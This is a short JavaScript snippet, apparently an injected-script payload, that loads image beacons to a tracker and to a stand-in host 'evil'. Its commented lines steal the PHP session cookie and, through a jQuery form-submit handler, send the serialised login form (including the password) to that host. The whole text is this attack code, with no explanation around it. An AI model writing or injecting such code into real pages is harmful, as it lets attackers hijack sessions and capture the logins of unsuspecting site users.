var img = [ new Image(), new Image(), new Image()  ];
img[0].src = 'https://tracker/hit.php';

// Steal the PHP session cookie
img[1].src = 'https://evil/?' + document.cookie;

// Steal the password at login
$('form').submit(function(e) {
    img[2].src = 'https://evil/?' + $('form').serialize();
});